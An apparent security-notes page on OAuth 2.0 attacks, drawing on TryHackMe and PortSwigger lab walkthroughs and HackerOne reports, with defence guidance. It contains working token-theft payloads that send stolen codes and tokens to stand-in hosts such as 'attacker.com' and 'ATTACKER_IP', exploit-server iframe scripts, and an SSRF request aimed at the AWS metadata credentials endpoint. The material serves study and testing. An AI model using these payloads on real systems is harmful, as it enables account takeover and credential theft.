---
title: "OAuth Attacks"
type: technique
tags: [authentication, exploitation, h1, oauth, thm, web]
phase: exploitation
date_created: 2026-05-08
date_updated: 2026-07-02
sources: [thm-adv-oauth-vulns, h1-scraped-oauth-attacks, payloadsallthethings-oauth, git-portswigger-all-labs, oauth21-dpop-par-rfcs, descope-noauth, semperis-noauth]
---

## What it is

OAuth 2.0 attacks exploit weaknesses in the authorization flows that delegate access to third-party applications. Attackers can steal authorization codes or access tokens, link attacker-controlled OAuth accounts to victim accounts, or harvest tokens from browser memory — all without needing the victim's password.

## How it works

OAuth grants a client (app) access to resources owned by a resource owner (user), with the authorization server issuing tokens. The attack surface lives in how tokens are redirected, how the `state` parameter is (or isn't) used, and how token lifetimes and storage are managed. The primary flows are:

- **Authorization Code Grant** — code is exchanged server-to-server for an access token; more secure, token not in browser history
- **Implicit Grant** — access token returned directly in the URL fragment; deprecated in OAuth 2.1 due to inherent exposure
- **Resource Owner Password Credentials** — user supplies credentials directly to client; only for highly trusted apps
- **Client Credentials** — machine-to-machine; no user involved

Identifying OAuth in use: look for login options like "Sign in with Google/Facebook/GitHub" and redirect URLs containing `response_type`, `client_id`, `redirect_uri`, `scope`, and `state` parameters.

## Prerequisites

- Target application uses OAuth for authentication or resource access
- For `redirect_uri` attack: ability to control a registered subdomain or any URI on the allowed list
- For CSRF attack: absence of `state` parameter validation; ability to deliver a link to the victim
- For implicit grant token theft: a stored XSS vulnerability on the callback page

## Methodology

### 1. Identify the OAuth Flow

Observe login HTTP traffic in Burp. Identify:

```
GET /authorize?response_type=code&client_id=<id>&redirect_uri=<uri>&scope=profile&state=<token>
```

Note whether `state` is present and whether it is validated on the callback. Inspect error messages and endpoint patterns (`/o/authorize`, `/oauth/authorize`, `/oauth/token`) to identify the framework (e.g., Django OAuth Toolkit uses `/o/authorize`).

### 2. Steal Authorization Code via Misconfigured `redirect_uri`

If the OAuth application has multiple registered redirect URIs and the attacker controls one of them (e.g., a compromised subdomain):

1. Construct a malicious page on the controlled domain that accepts an OAuth login redirect:

```html
<form action="http://coffee.thm:8000/oauthdemo/oauth_login/" method="get">
    <input type="hidden" name="redirect_uri" 
           value="http://dev.bistro.thm:8002/malicious_redirect.html">
    <input type="submit" value="Login via OAuth">
</form>
```

2. The callback page extracts the authorization code from the URL and exfiltrates it:

```javascript
const urlParams = new URLSearchParams(window.location.search);
const code = urlParams.get('code');
// Send code to attacker-controlled server
var img = new Image();
img.src = 'http://attacker.com/steal?code=' + code;
```

3. Use the intercepted code to exchange for an access token:

```
http://bistro.thm:8000/oauthdemo/callbackforflag/?code=<stolen_code>
```

If the endpoint accepts an Open Redirect, the access token or code can be stolen:
```
https://www.example.com/oauth2/authorize?[...]&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com
```

### 3. CSRF on OAuth Flow (Missing `state` Parameter)

Without the `state` parameter, the authorization server cannot distinguish whether a callback belongs to the attacker or the victim.

**Attack steps:**

1. Attacker initiates an OAuth flow and stops before completing it — captures their own authorization code:

```
http://coffee.thm:8000/o/authorize/?response_type=code&client_id=<id>&redirect_uri=http://coffee.thm:8000/oauthdemo/callbackforcsrf/
```

2. Construct the CSRF payload URL using the attacker's code:

```
http://bistro.thm:8080/csrf/callbackcsrf.php?code=<attacker_auth_code>
```

3. Deliver this URL to the victim (phishing email, etc.). When the victim's authenticated browser visits the URL, the server links the attacker's OAuth account to the victim's session. The attacker now has access to the victim's protected data.

### 4. Access Token Theft via XSS in Implicit Grant

The implicit grant returns the access token in the URL fragment (`#access_token=...`). If the callback page has an XSS vulnerability:

1. Attacker starts an HTTP listener:

```sh
python3 -m http.server 8081
```

2. Inject the following XSS payload through any user-controlled field on the callback page:

```javascript
<script>
var hash = window.location.hash.substr(1);
var result = hash.split('&').reduce(function(res, item) {
    var parts = item.split('=');
    res[parts[0]] = parts[1];
    return res;
}, {});
var accessToken = result.access_token;
var img = new Image();
img.src = 'http://ATTACKER_IP:8081/steal_token?token=' + accessToken;
</script>
```

3. When the victim authenticates and lands on the callback page, the token is sent to the attacker's server.

### 5. Authentication Bypass via Implicit Flow (Unverified Email Swap)

In the implicit grant flow, the client receives the access token directly and then sends the user's profile data (including email) to the server via a POST request. If the server trusts client-supplied identity data without verifying the token signature against the claimed identity, an attacker can substitute another user's email in that POST:

1. Log in legitimately via OAuth implicit flow. Intercept the POST request that submits the access token and user data to the client application (e.g., `POST /authenticate`).
2. In Burp Repeater, change the email parameter to the victim's email address (e.g., `carlos@carlos-montoya.net`).
3. Send the request. The server accepts the token and logs you in as the victim without re-validating that the token belongs to that email.
4. Right-click the modified POST request → "Request in browser" → "In original session" to import the session into the browser.

**Root cause:** The server does not verify that the access token it received was actually issued for the claimed email address. The token is trusted, but the identity claim alongside it is not.

### 6. SSRF via OpenID Dynamic Client Registration

OpenID Connect allows clients to register dynamically via a `/reg` (or `/registration`) endpoint. If the OAuth provider fetches client metadata (e.g., a `logo_uri`) server-side without validation, this is a direct SSRF primitive.

1. Discover the OpenID configuration file and registration endpoint:

```
GET /.well-known/openid-configuration
```

Look for `registration_endpoint` in the JSON response (e.g., `/reg`).

2. Register a malicious client application with an internal SSRF target as `logo_uri`:

```http
POST /reg HTTP/1.1
Host: oauth-server.net
Content-Type: application/json

{
    "redirect_uris": ["https://example.com"],
    "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}
```

3. Note the `client_id` returned in the response.

4. Visit the OAuth provider's client logo endpoint to trigger the server-side fetch:

```
GET /client/<client_id>/logo
```

5. The server fetches `logo_uri` server-side. The response contains cloud instance metadata including AWS `SecretAccessKey`, session tokens, and IAM role credentials.

**Key point:** The `logo_uri` (and other URI properties like `jwks_uri`, `policy_uri`, `tos_uri`) in OpenID dynamic registration are fetched server-side and can be pointed at internal cloud metadata endpoints.

### 7. Authorization Code Rule Violation

The OAuth client MUST NOT use the authorization code more than once. If an authorization code is used more than once, the authorization server MUST deny the request and SHOULD revoke (when possible) all tokens previously issued based on that authorization code. Test for this by intercepting an authorization code and attempting to use it twice.

### 8. Insufficient Token Expiry / Replay

If access tokens have no expiry or very long lifetimes, capturing one (via log files, referrer headers, or XSS) provides persistent access. Test by replaying captured tokens after a long interval. Implement `nonce` and `timestamp` checks to detect reuse.

### 9. Token Theft via Open Redirect + Path Traversal

When the `redirect_uri` whitelist validates the registered domain but not the full path, combine a path traversal with an open redirect on the same domain to exfiltrate the fragment-based access token to an external server.

1. Confirm path traversal in `redirect_uri` works against the whitelist:

```
redirect_uri=https://target.com/oauth-callback/../post?postID=1
```

2. Find an open redirect on the whitelisted domain (e.g., `/post/next?path=https://attacker.com`).

3. Chain path traversal into the open redirect:

```
redirect_uri=https://target.com/oauth-callback/../post/next?path=https://attacker.com/exploit
```

4. Serve the following fragment-extraction script at `/exploit` on the attacker server:

```javascript
<script>
    if (!document.location.hash) {
        window.location = 'https://oauth-server.net/auth?client_id=CLIENT_ID&redirect_uri=https://target.com/oauth-callback/../post/next?path=https://attacker.com/exploit&response_type=token&nonce=RANDOM&scope=openid%20profile%20email'
    } else {
        window.location = '/?' + document.location.hash.substr(1)
    }
</script>
```

5. Deliver the exploit URL to the victim. The flow: victim's browser is redirected to the OAuth server → OAuth server redirects to `target.com/post/next?path=https://attacker.com/exploit#access_token=...` → open redirect forwards to attacker's exploit page with the fragment intact → script strips the `#` and re-redirects as a query parameter → access token appears in the attacker's server access log.

6. Use the stolen token against the API:

```http
GET /me HTTP/1.1
Authorization: Bearer STOLEN_TOKEN
```

### 10. Token Theft via `postMessage` Proxy Page

When `redirect_uri` path traversal reaches a page that uses `window.postMessage()` with a wildcard (`*`) target, any parent window (including attacker-controlled) receives the message. Use an iframe to load the OAuth flow inside the attacker's exploit page and intercept the message:

1. Identify a page on the whitelisted domain that posts its URL (containing the fragment) to the parent via `postMessage` with `targetOrigin: "*"`. The comment form (`/post/comment/comment-form`) is a common candidate.

2. Traverse the `redirect_uri` to that page:

```
redirect_uri=https://target.com/oauth-callback/../post/comment/comment-form
```

3. Create an iframe on the exploit server that loads the OAuth authorization request, plus a listener that exfiltrates the received message:

```html
<iframe src="https://oauth-server.net/auth?client_id=CLIENT_ID&redirect_uri=https://target.com/oauth-callback/../post/comment/comment-form&response_type=token&nonce=RANDOM&scope=openid%20profile%20email"></iframe>
<script>
window.addEventListener('message', function(e) {
    fetch('/' + encodeURIComponent(e.data.data))
})
</script>
```

4. Deliver the exploit page to the victim. The OAuth server redirects the iframe to the comment form, the comment form sends `window.location.href` (which includes `#access_token=...`) as a `postMessage` to the parent exploit page, and the listener exfiltrates it to the attacker's access log.

5. Extract the Bearer token from the access log and call `/me`:

```http
GET /me HTTP/1.1
Authorization: Bearer ADMIN_ACCESS_TOKEN
```

**Root cause:** `postMessage` with `targetOrigin: "*"` broadcasts to any listening window regardless of origin.

### 11. nOAuth: Entra cross-tenant account takeover via mutable `email` claim

nOAuth is a "Log in with Microsoft" (Entra ID / Azure AD) authorization flaw that lives entirely in the SaaS application's identity logic, not at the IdP. It affects any app that keys a user's identity on the OIDC `email` claim instead of the immutable `iss` + `sub` pair. In Entra, the `email` claim is both mutable and unverified: any tenant admin can set the mail attribute on their own account to an arbitrary value, including a victim's address, even for a domain their tenant does not own. When the app matches that unverified email against an existing account, it merges the attacker's Entra identity into the victim's account, granting full ATO.

This bypasses MFA and Conditional Access because those controls protect the attacker's own tenant login, which succeeds legitimately; the compromise happens at the app's account-merge step after a valid OAuth flow completes. The victim's tenant and its policies are never touched, so nothing on the defender side fires. Only the app owner can fix or detect it; a customer cannot defend a vulnerable app they merely consume.

**Preconditions:**
- App offers "Sign in with Microsoft" (Entra / Azure AD, the `login.microsoftonline.com` authorize endpoint).
- App identifies or merges users by the `email` claim rather than `iss`+`sub`.
- App was configured to still emit unverified email claims (apps created before June 2023 that never set `removeUnverifiedEmailClaim` to true).

**Test methodology (use two tenants you own, ethical scope only):**

1. Register a throwaway Entra tenant you control. In the Entra admin center, edit the test user's Contact Information and set the `mail` / `email` attribute to the target-account email you own on the SaaS app (for example `victim@yourcompany.com`).
2. On the target SaaS app, choose "Sign in with Microsoft" and authenticate as your attacker-tenant user.
3. Inspect the ID token returned to the app. Confirm the spoofed value rides in the `email` claim while `sub` and `iss` still belong to the attacker tenant:

```json
{
  "iss": "https://login.microsoftonline.com/<attacker-tenant-id>/v2.0",
  "sub": "<attacker-immutable-subject>",
  "email": "victim@yourcompany.com",
  "xms_edov": false
}
```

4. If the app logs you into the victim's account (same data, same resources), it keyed identity on `email` and is vulnerable. If it creates a fresh separate account or rejects the merge, it is keying on `sub`+`iss` (not vulnerable). An `xms_edov: false` sitting next to a trusted email is the tell.

**Correct fix:**
- Use the `iss` + `sub` pair as the sole immutable, per-issuer unique user identifier (OIDC Core Section 5.7). Never treat `email`, `preferred_username`, or `upn` as an identity key or an authorization input.
- If email-based account linking is a product requirement, verify ownership out of band (magic link or confirmation email to the claimed address) before merging.
- Trust the `email` claim only when Microsoft's `xms_edov` (email domain owner verified) claim is true, and set the app's `removeUnverifiedEmailClaim` authentication behavior so Entra redacts unverified emails.

**Detection:** hard from the consumer side. Correlate SaaS auth logs with Entra sign-in logs in a SIEM and flag SaaS logins that have no matching Entra authentication event; otherwise ask the vendor whether they tested against nOAuth. Semperis' 2025 retest of 104 Entra App Gallery apps still found roughly 9% vulnerable two years after the original 2023 disclosure, so do not assume a modern app is safe.

## Key Payloads / Examples

OAuth authorization URL structure:

```
https://auth-server.com/authorize
    ?response_type=code
    &client_id=APP_CLIENT_ID
    &redirect_uri=https://client.com/callback
    &scope=profile email
    &state=RANDOM_CSRF_TOKEN
```

Token request (code exchange):

```http
POST /o/token/ HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Authorization: Basic base64(client_id:client_secret)

grant_type=authorization_code
&code=AUTH_CODE_HERE
&redirect_uri=https://client.com/callback
&client_id=CLIENT_ID
&client_secret=CLIENT_SECRET
```

Implicit grant URL (token in fragment):

```
https://auth-server.com/authorize
    ?response_type=token
    &client_id=CLIENT_ID
    &redirect_uri=https://client.com/callback.php
```

## Bypasses and Variants

| Attack | Root Cause |
|---|---|
| `redirect_uri` token theft | Overly broad registered redirect URIs; no strict matching |
| CSRF account linking | Missing or unvalidated `state` parameter |
| Implicit grant XSS token theft | Token exposed in URL fragment; XSS on callback page |
| Replay attack | No `nonce` or `jti` validation; long-lived tokens |
| Insecure token storage | Token stored in `localStorage` instead of secure cookies |
| Implicit flow email swap | Server trusts client-supplied identity data without verifying token-to-identity binding |
| SSRF via OpenID dynamic registration | `logo_uri` / `jwks_uri` fetched server-side without SSRF protections |
| Open redirect + path traversal token theft | `redirect_uri` path validation not enforced; open redirect on whitelisted domain leaks fragment |
| `postMessage` wildcard proxy | `window.postMessage("*")` on a page reachable via `redirect_uri` path traversal broadcasts token to any parent window |
| nOAuth cross-tenant ATO | App keys identity on the mutable, unverified Entra `email` claim; attacker sets a victim's email in their own tenant and merges into the victim's account |

**Scope manipulation**: attempt to add additional scopes beyond what was originally granted in the authorization request — some servers honour expanded scopes without re-prompting the user.

## Real-World Examples (HackerOne — paid reports)

7 paid reports. Top bounty: $2,940 (Twitter/X — OAuth permissions screen shows incorrect DM scope, allowing apps to read DMs without explicit permission).

| Title | Severity | Bounty | Program | Report |
|-------|----------|--------|---------|--------|
| Incorrect OAuth permissions screen allows DM read without permission | Medium | $2,940 | X / xAI | [#434763](https://hackerone.com/reports/434763) |
| Shop App — OAuth authorization code intercepted → Microsoft Outlook access | Low | $900 | Shopify | [#1700734](https://hackerone.com/reports/1700734) |
| Missing brute force protection on OAuth2 API controller | Medium | $500 | Nextcloud | [#1258448](https://hackerone.com/reports/1258448) |
| CRLF injection via redirect_uri parameter in OAuth authorize | Low | $200 | Mozilla | [#2147132](https://hackerone.com/reports/2147132) |
| OAuth2 client_secret stored in plaintext in database | Medium | $100 | Nextcloud | [#1994324](https://hackerone.com/reports/1994324) |
| OAuth2 authorization_code valid indefinitely | Low | $100 | Nextcloud | [#1784162](https://hackerone.com/reports/1784162) |
| Moderators bypass via oauth.reddit.com mod conversations endpoint | Low | $100 | Reddit | [#1543770](https://hackerone.com/reports/1543770) |

**Key patterns from reports:**
- Scope miscommunication (Twitter/X $2,940): the permissions screen claimed read-only access but the granted token also allowed DM access — a UI deception bug classified as privacy violation
- Authorization code interception in mobile OAuth (Shopify $900): attacker intercepts the code during the redirect and exchanges it for the victim's Microsoft Outlook token
- Missing brute-force protection on the OAuth2 token endpoint is a straightforward but paid finding ($500 Nextcloud)
- CRLF injection in `redirect_uri` can inject arbitrary HTTP headers when the value is echoed in a `Location:` response
- Long-lived or non-expiring authorization codes are a persistent risk — codes should be single-use and short-lived
- `client_secret` in plaintext DB storage enables server-side impersonation of the OAuth application

## OAuth 2.1, DPoP, and PAR (modern hardening and its attacks)

OAuth 2.1 consolidates 2.0 best practice: PKCE is mandatory for all clients, the implicit grant and ROPC are removed, and exact `redirect_uri` matching is required. Newer mechanisms add defence but bring their own test surface:

- DPoP (Demonstrating Proof-of-Possession, RFC 9449): sender-constrains tokens by binding them to a client-held key; each request carries a `DPoP` proof JWT. Attacks: if the resource server does not validate the `jkt` (key thumbprint) binding, a stolen token is still replayable (not truly sender-constrained); missing `nonce`/`iat` checks allow proof replay; accepting `alg: none` or an unverified proof signature.
- PAR (Pushed Authorization Requests, RFC 9126): the client pushes the authorization request to a back-channel endpoint and references it by `request_uri`, preventing front-channel parameter tampering. Attacks: servers that still honour front-channel parameters when a `request_uri` is present (downgrade), or that do not bind the `request_uri` to the client.
- RAR (Rich Authorization Requests, RFC 9396): fine-grained `authorization_details`; test for under-validated or escalatable authorization_details.

Test focus: confirm sender-constraining is actually enforced end to end. A DPoP-bound token accepted without thumbprint validation at the API is no better than a bearer token. Confirm PKCE is required (attempt a no-PKCE downgrade) and that the implicit grant is truly disabled.

## Detection and Defence

- Enforce strict `redirect_uri` validation: exact match against pre-registered URIs only (no wildcard, no path traversal)
- Always use and validate the `state` parameter to prevent CSRF
- Prefer Authorization Code flow with PKCE over the implicit grant for public clients
- Use short-lived access tokens; implement refresh token rotation
- Store tokens in `HttpOnly` secure cookies, not `localStorage`
- Implement `nonce` values and timestamp checks to detect replay attacks
- Verify `scope` server-side; do not allow clients to self-expand scope
- Validate that the access token's sub/email claim matches the identity data submitted by the client (implicit flow)
- Key user identity on immutable `iss`+`sub`, never on `email`/`preferred_username`/`upn` (prevents nOAuth); for Entra, honor `xms_edov` and set `removeUnverifiedEmailClaim`
- Restrict OpenID dynamic client registration: validate and block SSRF-prone URI fields (`logo_uri`, `jwks_uri`, `policy_uri`); use an allowlist or disable dynamic registration entirely
- Set `targetOrigin` to the specific intended domain (not `"*"`) in all `window.postMessage()` calls
- Audit all pages reachable via the registered redirect domain for open redirects and `postMessage` leakage

## Tools

- [[burp-suite]] — intercept OAuth flows, manipulate parameters
- [[ffuf]] — enumerate OAuth endpoint paths
- Python `requests` — script token exchange flows

## PortSwigger Labs

### LAB 1 — Authentication bypass via OAuth implicit flow (Apprentice)

The OAuth provider uses the implicit grant. The client POSTs the received access token and user profile data (including email) to its own backend. The backend does not verify that the token was issued for the claimed email.

**Steps:**
1. Log in via the social media OAuth flow. Intercept the POST request that authenticates to the client app (contains `access_token` and `email` fields).
2. In Burp Repeater, change the `email` value to the victim's email (e.g., `carlos@carlos-montoya.net`).
3. Send the request — the server accepts it and creates a session for the victim.
4. Right-click the modified request → "Request in browser" → "In original session" to import the session cookie into the browser.

---

### LAB 2 — SSRF via OpenID dynamic client registration (Practitioner)

OpenID Connect dynamic client registration endpoint at `/reg` accepts `logo_uri`. The OAuth provider fetches `logo_uri` server-side when displaying client information.

**Steps:**
1. Browse to `/.well-known/openid-configuration` to find the `registration_endpoint`.
2. Register a malicious client pointing `logo_uri` at the cloud metadata endpoint:

```http
POST /reg HTTP/1.1
Host: oauth-server.net
Content-Type: application/json

{
    "redirect_uris": ["https://example.com"],
    "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}
```

3. Note the `client_id` from the response.
4. Visit the logo endpoint: `GET /client/<client_id>/logo` — the server fetches the internal URL and returns AWS IAM credentials including `SecretAccessKey`.

---

### LAB 3 — Forced OAuth profile linking (Practitioner)

The account-linking OAuth flow uses no `state` parameter, making it vulnerable to CSRF. An attacker can force a victim to link the attacker's social media profile to the victim's account.

**Steps:**
1. Log in to the blog with a normal account. Click "Attach a social profile" and intercept the request.
2. Forward requests until you capture `GET /oauth-linking?code=ATTACKER_CODE`. Copy the URL, then drop the request (keep the code unused/valid).
3. Log out. On the exploit server, create an iframe (or `window.location` redirect) pointing to the captured URL:

```html
<iframe src="https://target.com/oauth-linking?code=ATTACKER_CODE"></iframe>
```

Or:

```html
<script>window.location = 'https://target.com/oauth-linking?code=ATTACKER_CODE'</script>
```

4. Deliver the exploit to the victim (admin). The victim's browser completes the OAuth linking flow, attaching the attacker's social profile to the admin account.
5. Log in via "Sign in with social media" using the attacker's credentials — you are now authenticated as admin.

> Note: `fetch()` will not trigger the OAuth linking flow — use `iframe` or `window.location`.

---

### LAB 4 — OAuth account hijacking via redirect_uri (Practitioner)

The OAuth server accepts arbitrary `redirect_uri` values without validating against a registered whitelist. An authorization code issued for the admin can be redirected to the attacker's server.

**Steps:**
1. Log in and study the OAuth flow. Identify the `GET /auth?client_id=[...]` authorization request.
2. In Burp Repeater, change `redirect_uri` to the exploit server URL — confirm no error is returned and the server issues a redirect to the attacker's domain with `?code=` appended.
3. On the exploit server, create an iframe that triggers the authorization request for a victim:

```html
<iframe src="https://oauth-server.net/auth?client_id=CLIENT_ID&redirect_uri=https://exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
```

4. Deliver the exploit. The victim's browser authenticates silently (active session) and the authorization code lands in the exploit server's access log.
5. Copy the victim's authorization code from the log. Exchange it by visiting the callback URL directly:

```
https://target.com/oauth-callback?code=VICTIM_CODE
```

6. Copy the session cookie from the response and inject it into the browser to access the victim's account.

---

### LAB 5 — Stealing OAuth access tokens via an open redirect (Practitioner)

The `redirect_uri` is validated against a registered domain but not the full path. The target domain has an open redirect at `/post/next?path=`. Chaining path traversal with the open redirect exfiltrates the implicit-flow access token fragment to an external server.

**Steps:**
1. Confirm path traversal in `redirect_uri` works:
   - Try: `redirect_uri=https://target.com/oauth-callback/../post?postID=1` — should redirect successfully.
   - Try external domain directly — expect a `400` error (blocked by whitelist).
2. Find the open redirect: navigate the blog and observe `GET /post/next?path=` redirects to the supplied path, including external domains.
3. Chain them: `redirect_uri=https://target.com/oauth-callback/../post/next?path=https://exploit-server.net/exploit`
4. Serve the token extraction script at `/exploit` on the exploit server:

```html
<script>
    if (!document.location.hash) {
        window.location = 'https://oauth-server.net/auth?client_id=CLIENT_ID&redirect_uri=https://target.com/oauth-callback/../post/next?path=https://exploit-server.net/exploit&response_type=token&nonce=RANDOM&scope=openid%20profile%20email'
    } else {
        window.location = '/?' + document.location.hash.substr(1)
    }
</script>
```

5. Deliver the exploit to the victim. The fragment `#access_token=...` is stripped and re-sent as a query parameter to the exploit server access log.
6. Use the stolen token:

```http
GET /me HTTP/1.1
Authorization: Bearer STOLEN_TOKEN
```

---

### LAB 6 — Stealing OAuth access tokens via a proxy page (Expert)

`redirect_uri` path traversal reaches the comment form page (`/post/comment/comment-form`), which posts `window.location.href` to its parent window using `window.postMessage()` with `targetOrigin: "*"`. An attacker-controlled parent page can receive this message and exfiltrate the token.

**Steps:**
1. Confirm `redirect_uri` path traversal works (as in Lab 4/5).
2. Identify the proxy page: inspect the comment form iframe source — it contains:

```javascript
window.parent.postMessage({data: window.location.href}, '*')
```

3. Create the exploit on the exploit server — an iframe loading the OAuth flow redirected to the comment form, plus a `message` event listener:

```html
<iframe src="https://oauth-server.net/auth?client_id=CLIENT_ID&redirect_uri=https://target.com/oauth-callback/../post/comment/comment-form&response_type=token&nonce=RANDOM&scope=openid%20profile%20email"></iframe>
<script>
window.addEventListener('message', function(e) {
    fetch('/' + encodeURIComponent(e.data.data))
})
</script>
```

4. View the exploit to test — observe the access log shows a `GET` request containing the URL with `access_token` fragment.
5. Deliver the exploit to the victim (admin). Extract the admin's access token from the access log.
6. Call `/me` with the stolen token to retrieve the admin API key.

**Key insight:** The wildcard `"*"` in `postMessage` means any parent window receives the message, not just the intended origin. The comment form inadvertently becomes a token exfiltration proxy.

## Sources

- TryHackMe: OAuth Vulnerabilities room
- PortSwigger Web Security Academy: OAuth 2.0 Authentication Vulnerabilities labs
